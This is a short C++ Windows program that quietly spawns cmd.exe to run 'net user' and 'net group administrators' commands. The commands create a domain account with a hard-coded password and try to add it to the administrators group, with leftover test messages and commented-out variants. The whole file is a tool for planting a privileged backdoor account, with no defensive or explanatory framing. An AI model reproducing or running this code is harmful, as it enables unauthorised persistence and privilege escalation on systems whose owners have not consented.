// Adduser.cpp : Defines the entry point for the console application.
//

//" Using CreateProcess to add a user a sytem, modify and compile
#include "stdafx.h"
#include "windows.h"

int _tmain(int argc, _TCHAR* argv[])
{

	wprintf(L"Yes");
	STARTUPINFOW SI={sizeof(STARTUPINFOW)};
	SI.wShowWindow = SW_HIDE;
 LPTSTR AppName=L"C:/Windows/cmd.exe";
    wchar_t Command[] = L"net.exe user user password /add /domain"; 

	PROCESS_INFORMATION PI;
	BOOL bRet =  
		//CreateProcess(AppName, Command, 0, 0, 0, CREATE_DEFAULT_ERROR_MODE, 0, 0, &SI, &Pi);
		//CreateProcessW(L"cmd.exe",L"net.exe user username password /add /domain",0,0,TRUE,CREATE_NEW_CONSOLE,0,0,&SI,&PI);
	     CreateProcess(L"C:\\WINDOWS\\System32\\cmd.exe", L"/c net.exe user username password /add /domain", NULL, NULL, false, 0, NULL, NULL, &SI, &PI);
	
	if(bRet != TRUE)
	{
		return -1;
	}


	wprintf(L"Yes");


	STARTUPINFOW SI_ = {sizeof(SI_)};
	SI_.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION PI_;
	bRet =    CreateProcess(L"C:\\WINDOWS\\System32\\cmd.exe", L"/c net.exe group administrators username /add /domain", NULL, NULL, false, 0, NULL, NULL,&SI_,&PI_);
	if(bRet == TRUE)
	{
		MessageBox(0,L"TEst",L"Test",0);
		return 0;
		//bRet =    CreateProcess(L"C:\\WINDOWS\\System32\\cmd.exe", L"/c net.exe group administratos username /add /domain", NULL, NULL, false, 0, NULL, NULL,&SI_,&PI_);
	}

	return -1;

}

